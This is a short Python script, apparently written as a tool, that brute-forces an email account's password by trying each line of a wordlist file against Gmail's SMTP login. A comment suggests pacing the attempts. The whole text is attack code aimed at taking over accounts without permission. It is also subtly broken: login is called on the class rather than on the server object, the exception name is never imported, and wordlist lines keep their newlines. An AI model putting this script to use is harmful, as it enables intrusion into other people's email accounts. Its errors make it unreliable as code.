from smtplib import SMTP
server = SMTP('smtp.gmail.com',587) #change this according to email provider. format: ('server',port)
server.ehlo()
server.starttls()

emailAddr = input("Enter an email address you wish to brute force")
emailPass = input("Enter a file to load to a wordlist from")
wordList = open(emailPass,'r')

for password in wordList:
    try:
        SMTP.login(emailAddr,password)
        print(" + Password found ---> ", password)
    except smtplib.SMTPAuthenticationError:
        print(" - Password incorrect ---> ", password)
        #you may add a 'time.sleep()' on this line. 0.1 seconds or so should be enough.
